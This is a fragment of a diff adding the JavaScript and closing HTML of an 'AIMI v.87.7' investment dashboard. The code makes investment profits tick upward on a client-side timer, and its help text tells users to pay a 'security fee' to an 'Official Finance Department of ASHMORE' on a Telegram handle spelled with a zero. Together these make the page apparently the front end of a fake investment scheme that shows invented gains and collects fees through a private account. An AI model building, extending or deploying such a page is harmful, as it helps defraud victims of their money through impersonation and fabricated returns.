+📞 Official Contact for Fee Submission & Support:
+For security fee submission and customer assistance, please contact the Official Finance Department of ASHMORE on Telegram:
+👉 @Official_Finance_0f_ASHMORE`;
+
+      showModal('Help & Support — AIMI v.87.7', helpText);
+    }
+
+    /* --------------------------
+       Modal / overlay builder
+       -------------------------- */
+    function openNotice(title, message){
+      // Small helper so the action tiles can trigger notices
+      showModal(title, message);
+    }
+
+    function showModal(title, content) {
+      const overlay = document.getElementById('modalOverlay');
+      const safeContent = escapeHtml(content).replace(/\n/g, '<br>');
+      overlay.innerHTML = `
+        <div style="background:rgba(2,6,23,0.45); position:fixed; inset:0; display:flex; align-items:center; justify-content:center;">
+          <div style="background:#fff; max-width:720px; width:92%; border-radius:12px; padding:18px; box-shadow:0 18px 60px rgba(2,6,23,0.35);">
+            <div style="display:flex; justify-content:space-between; gap:12px; align-items:flex-start;">
+              <div style="flex:1;">
+                <h3 style="margin:0 0 8px 0;">${escapeHtml(title)}</h3>
+                <div class="muted" style="font-size:14px;">${safeContent}</div>
+              </div>
+              <div style="text-align:right;">
+                <button class="btn ghost" onclick="closeModal()">Close</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+      overlay.classList.remove('hidden');
+    }
+
+    function closeModal() {
+      const overlay = document.getElementById('modalOverlay');
+      overlay.innerHTML = '';
+      overlay.classList.add('hidden');
+    }
+
+    /* --------------------------
+       Utilities
+       -------------------------- */
+    function escapeHtml(str){
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g,'&amp;')
+        .replace(/</g,'&lt;')
+        .replace(/>/g,'&gt;');
+    }
+
+    function numberWithCommas(x){
+      return String(x).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+    }
+
+    function showToast(text) {
+      const t = document.createElement('div');
+      t.style.position = 'fixed';
+      t.style.top = '22px';
+      t.style.right = '22px';
+      t.style.background = '#05264a';
+      t.style.color = '#fff';
+      t.style.padding = '10px 14px';
+      t.style.borderRadius = '10px';
+      t.style.boxShadow = '0 8px 30px rgba(2,6,23,0.3)';
+      t.style.zIndex = 99999;
+      t.style.fontSize = '14px';
+      t.innerText = text;
+      document.body.appendChild(t);
+      setTimeout(()=> t.style.opacity = '0.02', 2500);
+      setTimeout(()=> {
+        try { document.body.removeChild(t); } catch(e) {}
+      }, 3200);
+    }
+
+    function logoutToFront() {
+      localStorage.removeItem('aimi_authenticated');
+      localStorage.removeItem('aimi_verified_code');
+      localStorage.removeItem('aimi_has_special_investment');
+      // stop intervals (so no background timers remain)
+      stopAllInvestmentIntervals();
+      document.getElementById('verifyInput').value = '';
+      document.getElementById('verifyMsg').innerText = '';
+      showPage('page-front');
+      showToast('Logged out — returned to front screen.');
+    }
+
+    /* --------------------------
+       Dashboard helper: show/hide My Investments tile based on special code flag
+       -------------------------- */
+    function setupDashboardButtons() {
+      const tile = document.getElementById('myInvestmentsTile');
+      const hasFlag = localStorage.getItem('aimi_has_special_investment') === '1' || currentVerifiedCode === SPECIAL_CODE || localStorage.getItem('aimi_verified_code') === SPECIAL_CODE;
+      if (tile) {
+        tile.style.display = hasFlag ? 'flex' : 'none';
+      }
+    }
+
+    /* --------------------------
+       Init: check auth flag in localStorage
+       - restore currentVerifiedCode and investments
+       - if investments exist, start their auto-update intervals (only for demo)
+       -------------------------- */
+    (function init(){
+      const authed = localStorage.getItem('aimi_authenticated');
+      const savedCode = localStorage.getItem('aimi_verified_code');
+      if (savedCode) currentVerifiedCode = savedCode.toUpperCase();
+
+      // start intervals for existing investments so they auto-increment after reload
+      const invs = getInvestments();
+      invs.forEach(i => startAutoProfitForInvestment(i.projectId));
+
+      if (authed === '1') {
+        showPage('page-dashboard');
+        renderProjects();
+      } else {
+        showPage('page-front');
+      }
+    })();
+  
+    /* ===========================
+       End of JS
+       =========================== */
+  </script>
+</body>
+</html>
